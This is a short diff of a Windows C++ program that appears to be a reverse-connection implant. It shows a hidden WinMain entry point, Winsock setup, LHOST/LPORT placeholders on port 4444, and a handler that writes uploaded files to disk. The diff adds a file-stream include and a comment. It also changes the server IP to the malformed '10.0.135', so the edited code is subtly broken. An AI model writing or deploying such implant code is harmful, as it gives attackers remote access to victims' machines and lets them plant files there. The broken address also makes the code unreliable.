@@ -2,6 +2,7 @@
 #include <string>
 #include <winsock2.h>
 #include <windows.h>
+#include <fstream> // Required for file operations
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -42,7 +43,7 @@ void handleUpload(SOCKET& connSocket) {
         string fileName = uploadCommand.substr(7);  // Extract filename
 
         // Open the file to write
-        ofstream outFile(fileName, ios::binary);
+        ofstream outFile(fileName, ios::binary);  // Ensure ofstream is correctly used
         if (!outFile) {
             return;
         }
@@ -64,7 +65,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     WSADATA wsaData;
     SOCKET connSocket;
     sockaddr_in serverAddr;
-    string serverIP = "10.0.1.35";  // Replace with LHOST (server IP)
+    string serverIP = "10.0.135";  // Replace with LHOST (server IP)
     int serverPort = 4444;  // Replace with LPORT (server port)
 
     // Initialize Winsock
